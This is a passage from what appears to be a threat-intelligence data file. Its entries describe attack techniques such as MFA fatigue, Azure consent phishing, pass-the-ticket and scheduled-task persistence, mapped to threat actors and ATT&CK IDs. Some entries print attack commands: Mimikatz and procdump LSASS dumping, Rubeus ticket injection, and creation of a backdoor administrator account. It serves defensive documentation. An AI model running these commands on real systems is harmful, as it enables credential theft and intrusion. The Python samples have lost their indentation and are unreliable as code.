",1,2024-01-29,2024-02-06,,,{'support::synergize': ['3b1026c6-7d04-4b91-ba6f-abc68e993616']},"[ICS] Wizard Spider, UNC1878, [ICS] APT38, Lazarus Group, [ICS] Dragonfly, ENERGETIC BEAR, [Enterprise] menuPass, APT10, [Enterprise] Chimera, APT20, [ICS] FIN6, FIN6, [Enterprise] Ke3chang, APT15, [Enterprise] MuddyWater, MuddyWater, [Enterprise] Turla, Turla, [ICS] OilRig, OilRig, [Enterprise] BRONZE BUTLER, Tick, [Enterprise] Fox Kitten, Fox Kitten",T1087.002
1040ebd2-4659-4844-9238-95fa69a7e63c,AWS Compute instance deployed in unusual region,Threat Vectors,clear,"Certain threat actors will try to launch AWS compute instances 
(EC2, EKS, ECS) instances to achieve their objectives

One of the main vectors currently is to monetize access to 
privileged AWS credentials by deploying new compute instances of various types 
to mine cryptocurrencies. To hide their deployed instances, a threat actor 
may deploying the resources into unused regions, where they may go 
unnoticed.

Additionally threat actor may launch compute instances to act as staging 
platforms for serving malware for other campaigns.

It is expected that threat actors will potentially use compute instances 
for other purposes than the 2 listed above.
",1,2022-12-12,2022-12-12,,,,"[Enterprise] TeamTNT, TeamTNT",T1496
56500aed-5dec-42a8-a275-f1392abac979,MFA fatigue,Threat Vectors,clear,"MFA fatigue (aka MFA abuse, MFA bombing or MFA spamming) is a popular technique
due to its low complexity and high success rate.

It is a social engineering attack strategy where attackers repeatedly push
second-factor authentication requests to the target user email, phone, or registered
devices. The goal is to spam users to the point where they are annoyed by the constant 
notifications and approve one so it will stop. By doing so, the attacker has effectively 
bypassed MFA by tricking the user into approving the login attempt.

The fact that the attacker can trigger MFA push notifications means they obtained
the credentials of the user. This attack is often preceded by other social engineering
attack vectors, such as phishing, to gain credentials. Stolen credentials may also
be acquired from the dark web or via many other attack vectors.

Attacker may trigger push notifications throughout the day with the hopes that
one of the attempts will coincide with the user login activity, so the user will
approve it without suspicion.

MFA fatigue attack chain unfolds as follows:

1. User credentials and information are collected.
The attack begins with user information already available. The attacker will typically
have access to a victim username, password, or recovery credentials. This might be
sourced from preliminary attacks (such as phishing or social engineering) or may have
been exposed credentials from a larger breach.

2. Stolen credentials are used to send MFA push notifications.
The attackers then use the gained credentials to sign-in to a target account or device
secured by push multi-factor authentication. Typically, the attacker will attempt
to activate the authenticating application push notifications in quick succession.
These push notifications can happen over email, text message, or desktop notification,
but are generally pushed to the user authenticated mobile device.

3. User gets push notifications and becomes fatigued.
The user will now rapidly receive push notifications as the attacker attempts to
overwhelm them. The attacker goal is for the victim to push “yes” and confirm their
identity, allowing the attacker to go further into their account or device.
Often, the user may think it is a simple application malfunction or a test,
or just want the notifications to end out of annoyance.
",1,2024-10-21,2024-11-11,,,"{'sequence::succeeds': ['1a68b5eb-0112-424d-a21f-88dda0b6b8df', 'dd5d942c-bac4-4000-b9a6-ca4fef6cfb84'], 'atomicity::implements': ['4a807ac4-f764-41b1-ae6f-94239041d349']}","[Enterprise] Chimera, [Enterprise] Kimsuky, TA406, [Mobile] LAPSUS$, LAPSUS, [Enterprise] APT29, UNC2452","T1111, T1621"
24503678-9a1b-4af3-9837-a90bf47b7dda,Scheduled tasks created with taskschlr.exe,Threat Vectors,clear,"A threat actor can use the Task Scheduler to create tasks for nefarious purposes. For example, during 
the creation of a task in Task Scheduler > Create Task, the newly created task can be configured with 
specific options in the tab ""Action"". Through the ""Action"" settings the threat actor can specify 
the actions for the task to execute, which often include outbound connections to attacker 
infrastructure, binary execution or registry entry editing or creation.

Example: 

Action: ""Start a program""
In Program/script field: C:\ProgramData\<name.exe>

Tasks are stored in C:\Windows\System32\Tasks\ in XML format.

They reside in the following registry:

HKLM\Software\Microsoft\Windows\CurrentVersion\Schedule\TaskCache\Tasks\{GUID}

“Actions” value stored within the Tasks\{GUID} key points to the command line associated with the task.
In the registry under HKLM\Software\Microsoft\Windows\CurrentVersion\Schedule\TaskCache\Tasks\{GUID}
there is a registry key for the task with a key ""Actions"" related to Tasks\{GUID} id. In ""Edit Binary Value""
of the registy key ""Action"" there is a reference to the path which can contain malicious executable file,
for example: C:\Windows\System32\taskschlr.exe or other.

Similar information is stored within an extensionless XML file, created within C:\Windows\System32\Tasks, 
where the name of the file matches the name of the task. 

Example for Settings section in XML file with potentially malicious executable file: 

<Task version=""the_version"" xmlns=""http_link"">
 ...
 </Settings>
 <Actions Context=""Author"">
   <Exec>
    <Command>C\Windows\System32\taskschlr.exe</Command>
   </Exec>
 <Actions>
</Task>
",2,2022-12-12,2022-12-13,,,,"[Enterprise] HAFNIUM, HAFNIUM",T1053.005
4e7eae8e-6615-41f2-bfe1-21a04f7a6088,Azure - Gather Victim Data,Threat Vectors,clear,"The ""Gather Victim Data"" is a reconnaissance threat vector within the 
Azure Threat Research Matrix (ATRM). It involves an adversary accessing a user's 
personal data after compromising their account. This data may include sensitive 
information stored in Microsoft cloud services such as email, OneDrive, Teams, and 
other personal content linked to the user's Azure Active Directory account.

#### Example Attack Scenario  

- An attacker creates a malicious Azure application that requests access permissions 
to victim data like emails, OneDrive files, or Teams messages. 
- The attacker then sends a phishing email to a target user within an organization, 
tricking them to grant consent to this malicious app.
- Once the user grants access, the app obtains delegated permissions to access the 
victim's data across Microsoft 365 services.
- The attacker uses the obtained tokens or permissions to programmatically extract 
emails, files, conversations, and other personal or organizational data.
- The attacker may use this data for further phishing, reconnaissance, or lateral 
movement attacks within the Azure tenant.

#### Attack Goals and Impact  

- **Goals**: Steal sensitive business or personal information, emails, files, and 
communications to gain insights into victims, plan secondary attacks, or conduct espionage.
- Gain privileged information for later stages of attacks (e.g., lateral movement, 
credential theft, privilege escalation).
- Use stolen data for spear phishing campaigns or to impersonate trusted users internally 
or externally.
- Maintain persistence by harvesting tokens and credentials for prolonged access.
- Impact includes data breaches, intellectual property theft, regulatory compliance 
violations, reputational damage, and financial loss.

#### Attack Flow and Methodology

1. **Token Theft**: Using OAuth tokens or API calls, attacker programmatically accesses 
victim data such as emails, OneDrive files, Teams conversations.
2. **Data Collection and Exfiltration**: Captured data is collected, filtered, and 
exfiltrated for further use. This can be automated via scripts or tools like 365-Stealer.
3. **Lateral Movement / Escalation**: Using gathered intelligence, the attacker 
identifies high-value targets, escalates privileges, or moves laterally across the enterprise.
4. **Persistence and Cover-Up**: The adversary maintains presence, possibly by registering 
additional apps or accounts and attempts to remain undetected by throttling activity 
or delaying requests.
",2,2025-08-04,2025-09-04,,,"{'sequence::preceeds': ['dd5d942c-bac4-4000-b9a6-ca4fef6cfb84', '1a68b5eb-0112-424d-a21f-88dda0b6b8df']}","APT32, FIN13, [ICS] HEXANE, LAPSUS, [Enterprise] Magic Hound, Operation Wocao, [Enterprise] Star Blizzard, Volt Typhoon","T1589, T1590, T1078.004"
f9a6f927-d08c-40c1-85af-01331c471def,Phishing with Azure AD B2B Collaboration,Threat Vectors,clear,"Phishing with Azure AD B2B Collaboration involves exploiting the service to send 
malicious invitations that appear to come from Microsoft or other third-parties,
making it difficult for the user to detect that it is not legitimate.
Here are the key points:

### Malicious Invitations 
Adversaries can create a free trial for Azure AD Premium and set up an Enterprise App 
with single sign-on (SSO) through a user-defined URL, which can be the adversary 
own website. This app can then be assigned to new users, allowing the adversaries to 
insert phishing recipients[1].

### Email Elements
The invitation email typically includes a warning about phishing, but the email 
itself appears legitimate. It is sent from a Microsoft address and includes a link 
to a landing page that may redirect users to the adversary site. The email may 
also include the inviter name and profile image for added credibility[3].

### Authentication Flow 
When a user accepts the invitation, they are redirected to the adversary site, 
may look like a legitimate Microsoft page. This can be achieved by creating an 
outdated OneDrive logo or using a well-known brand name in the Entra ID organization[1].

### Technical Details 
The phishing campaign can be set up using PowerShell commands to manage Azure AD 
and MSOnline modules. The adversaries can also use the Create invitation API to 
customize the invitation message and ensure it appears legitimate[2][4].
",2,2023-12-12,2025-10-01,,,,"[Enterprise] APT29, UNC2452",T1566
03cc9593-e7cf-484b-ae9c-684bf6f7199f,Pass the ticket using Kerberos ticket,Threat Vectors,clear,"Pass-the-Ticket using Kerberos tickets is an advanced method wherein threat 
actors illicitly extract and exploit Kerberos tickets to gain unauthorized 
access within a network. In the Kerberos authentication process, a Ticket 
Granting Ticket (TGT) is issued to users upon login. Adversaries involves 
the extraction of these Kerberos tickets through various means, such as 
leveraging vulnerabilities, utilizing tools like Mimikatz, or exploiting 
system weaknesses.   

Subsequently, adversaries misuse the acquired tickets to authenticate
themselves on other network systems without the need for the user's
password, allowing lateral movement and potential access to sensitive
information. Commonly employed tools, like Mimikatz and Rubeus,
facilitate these malicious activities.  

There are several types of possible TGT (ticket granting ticket)
authentication methods, for example:   

1. Credential theft technique permitting lateral movement, escalating
privileges, and gaining access to sensitive resources (TGT)  

2. Silver Ticket: Compromising Service Accounts with Kerberos Silver
Tickets (forged TGS for specific Services); The Silver ticket attack
is based on crafting a valid TGS for a service once the NTLM hash
of a user account is owned. In this case, the NTLM hash of a computer
account (which is kind of a user account in AD) is owned. Hence, it is
possible to craft a ticket in order to get into that machine with
administrator privileges through the SMB service. (ref [3])  

3. Golden Ticket: (forged TGTs) 
The Golden ticket technique is similar to the Silver ticket one,
but in this case a TGT is crafted by using the NTLM hash of the krbtgt
AD account. The advantage of forging a TGT instead of TGS is being able
to access any service (or machine) in the domain. (ref [3])    

### Tools

To carry out these attacks, adversaries use various types of tools,
such as:    

#### Mimikatz  

Commands:  

sekurlsa::Minidump lsassdump.dmp
sekurlsa::logonPasswords

#### Rubeus  

Commands:  

\Rubeus.exe /ticket:base64blob
\Rubeus.exe ptt /ticket:BASE64BLOBHERE

#### Procdump  

Commands:  

procdump -ma lsass.exe lsass_dump  

The klist command that permit to see the Kerberos Tickets are the following:  

- Syntax: klist [-lh <logonID.highpart>] [-li <logonID.lowpart>] tickets | tgt | purge | sessions | kcd_cache | get | add_bind | query_bind | purge_bind
      * The syntax is related to Kerberos ticket management and credential cache management.

- Parameters:
    * -lh: Denotes the high part of the user's locally unique identifier (LUID), expressed in 
    hexadecimal. If neither -lh nor -li are present, the command defaults to the LUID of the 
    user who is currently signed in.
    * -li: Denotes the low part of the user's locally unique identifier (LUID), expressed in hexadecimal. 
    If neither -lh nor -li are present, the command defaults to the LUID of the user who is currently signed in.
    * tickets: Lists the currently cached ticket-granting-tickets (TGTs), and service tickets of the specified 
    logon session. This is the default option.
    * tgt: Displays the initial Kerberos TGT.
    * purge: Allows you to delete all the tickets of the specified logon session.
    * sessions: Displays a list of logon sessions on this computer.
    * kcd_cache: Displays the Kerberos constrained delegation cache information.
    * get: Allows you to request a ticket to the target computer specified by the service principal name (SPN).
    * add_bind: Allows you to specify a preferred domain controller for Kerberos authentication.
    * query_bind: Displays a list of cached preferred domain controllers for each domain that Kerberos has contacted.
    * purge_bind: Removes the cached preferred domain controllers for the domains specified.
    * kdcoptions: Displays the Key Distribution Center (KDC) options specified in RFC 4120.
",2,2022-09-23,2025-10-01,,,,"[Enterprise] APT29, UNC2452, [Enterprise] APT32, APT32, [Enterprise] BRONZE BUTLER, Tick",T1550.003
596d294a-9aa8-41b2-9507-5c9d605de6b4,Use Windows utilities to manipulate a local account or group,Threat Vectors,clear,"Local account manipulation involves creating, modifying, or exploiting local 
user accounts on a computer system, typically for malicious purposes. Local 
accounts are user accounts stored and managed locally on a specific computer 
device.

### Utilities Related to Local Account Manipulation:

#### 1. net.exe
**Description**: A command-line utility used for network administration tasks, 
including managing user accounts and network shares. Threat actors can use 
it to create new user accounts and add them to privileged groups.

Example:

```bash
net user attacker P@ssw0rd! /add
net localgroup administrators attacker /add
```
This sequence creates a new user named ""attacker"" and adds them to the local 
administrators group, granting full system access.

#### PowerShell Cmdlets
##### New-LocalUser 
The New-LocalUser cmdlet is used to create a new local 
user account on a Windows machine.
`New-LocalUser -Name ""username"" -Password (ConvertTo-SecureString ""P@ssw0rd!""
 -AsPlainText -Force) -Description ""Description"" -FullName ""Full Name""`

Parameters:
-Name: Specifies the name of the new local user.
-Password: Assigns a password to the new user account. The password must be 
provided as a **secure string.**
-Description: (Optional) Adds a description for the user account.
-FullName: (Optional) Provides the full name of the user.

##### Add-LocalGroupMember
The Add-LocalGroupMember cmdlet adds a user to a local group, which can be 
used to grant the user additional privileges.
`Add-LocalGroupMember -Group ""Administrators"" -Member ""username""`

Parameters:
-Group: Specifies the local group to which the user will be added.
-Member: Specifies the user account to add to the group.


#### Changing a Local Password
Using net.exe: The net.exe utility can be used to change a user's 
password.  

`net user username newpassword``

Using PowerShell: PowerShell can also be used to change a 
local user's password.  

```
$user = [ADSI](""WinNT://./username,user"")
$user.SetPassword(""NewP@ssw0rd!"")
",3,2024-11-06,2025-02-10,,,"{'atomicity::implements': ['d5039f2c-9fcc-4ba3-ad6a-da8c891ba745'], 'sequence::preceeds': ['e3d7cb59-7aca-4c3d-b488-48c785930b6d', '06523ed4-7881-4466-9ac5-f8417e972d13', '66277f27-d57b-47f8-bc9c-b024c7cd1313']}","WIZARD SPIDER, APT29, Lazarus Group","T1546, T1562.001, T1078.003, T1136.001, T1087.001, T1098.007"
2b560980-d4c6-428c-963f-697e7e29938c,Scheduled tasks created with command line,Threat Vectors,clear,"Adversaries can use  Windows Command Shell (cmd.exe) to execute specific commands 
to create scheduled tasks for the purposes of dwelling, execution of binaries, 
or for communication to Command and Control server infrastructure.


Examples for creation of a scheduled task via command-line interface:

1. Create a daily task to run at specific time:

   SCHTASKS /CREATE /SC DAILY /TN ""FOLDERPATH\TASKNAME"" /TR ""C:\SOURCE\FOLDER\APP-OR-SCRIPT"" /ST HH:MM

The folder path before the task name, under the /TN option, is not a requirement, 
but it'll help to keep the tasks separated. If the path is not specified, the task 
will be created inside the Task Scheduler Library folder.

2. Create a weekly task to run at specific time:

  SCHTASKS /CREATE /SC WEEKLY /D SUN /TN ""FOLDERPATH\TASKNAME"" /TR ""C:\SOURCE\FOLDER\APP-OR-SCRIPT"" /ST HH:MM

3. Create monthly task to run at specific time:

  SCHTASKS /CREATE /SC MONTHLY /D 15 /TN ""FOLDERPATH\TASKNAME"" /TR ""C:\SOURCE\FOLDER\APP-OR-SCRIPT"" /ST HH:MM

4. Create a scheduled task that runs daily as a specific user:

  SCHTASKS /CREATE /SC DAILY /TN ""FOLDERPATH\TASKNAME"" /TR ""C:\SOURCE\FOLDER\APP-OR-SCRIPT"" /ST HH:MM

Parameters that can be used in creation scheduled task command:

 /CREATE - specifies the creation a new automated routine task
 /SC - define the schedule of the task, for example it can include
 MINUTE, HOURLY, DAILY, WEEKLY, MONTHLY, ONCE, ONSTART, ONLOGON, ONIDLE, and ONEVENT.
 /D — specifies the day of the week to execute the task. (examples MON, TUE and etc)
 /TN — specifies the task name and location, the task can be created in a specific
 location directory (example /TN ""FOLDERPATH\TASKNAME"")
 /ST — defines the time to run the task (in 24 hours format)
 /RU — specifies the task to run under a specific user account.
 /QUERY — displays all the system tasks.
",4,2022-12-09,2022-12-13,,,,"[Enterprise] TA505, TA505",T1053.005
a566e405-e9db-475f-8447-7875fa127716,Script execution on Windows for credential manipulation,Threat Vectors,clear,"One example of script execution for credential manipulation is the use of a
Python or other type of script to access and read/change a user's credentials
stored in a file, such as Windows Credential Manager. 
The script could be designed to read the file, decrypt the stored
credentials, make changes to the username or password, and then save the
updated information back to the file. Threat actors are using also different
cmd utilities in combination with script commands to gain or modify user's
credentials. For example, such utilities can be cmdkey, keyring libraries
and others.

Example for a script that can manipulate a credentials file:

import os
import json
import base64

# Function to encrypt the credentials
def encrypt_credentials(credentials):
encoded_credentials = base64.b64encode(json.dumps(credentials).encode())
return encoded_credentials.decode()

# Function to decrypt the credentials
def decrypt_credentials(encoded_credentials):
decoded_credentials = json.loads(base64.b64decode(encoded_credentials).decode())
return decoded_credentials

# Function to update the credentials
def update_credentials(username, password):
# Reading the credentials from file
with open(""credentials.txt"", ""r"") as file:
    encoded_credentials = file.read()
# Decrypting the credentials
credentials = decrypt_credentials(encoded_credentials)
# Updating the username and password
credentials[""username""] = username
credentials[""password""] = password
# Encrypting the updated credentials
encoded_credentials = encrypt_credentials(credentials)
# Saving the updated credentials to file
with open(""credentials.txt"", ""w"") as file:
    file.write(encoded_credentials)

# Function call to update the credentials
update_credentials(""new_username"", ""new_password"")

Example for python code which extracts user's credentials with cmdkey utility:

import os

os.system('cmdkey /add:TERMSRV/X.X.X.X/user:Administrator /pass:<password>')
os.system('mstsc /v:X.X.X.X')
os.system('cmdkey /delete:TERMSRV/X.X.X.X')

Example for keyring library python script for credential manipulation.
Keyring libraries are used to manage the credentials. In the script threat 
actors are using different functions like: set_credentials(),
get_credentials() and update_credentials() to set, retrieve or change
username and password for the specific user or service. Keyring library
uses the operating system's secure storage to store the credentials. 
This secure storage provides credential encryption and the passwords are
not stored in plain text.

import keyring

# Function to set the credentials
def set_credentials(username, password):
keyring.set_password(""service_name"", username, password)

# Function to get the credentials
def get_credentials():
username = input(""Enter your username: "")
password = keyring.get_password(""service_name"", username)
return username, password

Some credential stealers, for example Ryuk and TrickBot are based on custom
scripts. For example, TrickBot is configured to use network propagation
script modules (sharedll and tabdll) that rely on SMB and can harvest
credentials and propagate to additional systems in the network.
",5,2023-01-26,2025-10-01,,,,"[Enterprise] APT29, UNC2452, [Mobile] APT28, APT28, [Enterprise] Chimera, [ICS] Wizard Spider, UNC1878, [ICS] FIN6, FIN6, [ICS] FIN7, FIN7, [Enterprise] APT32, APT32, [Enterprise] APT37, APT37","T1098.001, T1059.003, T1555, T1003"
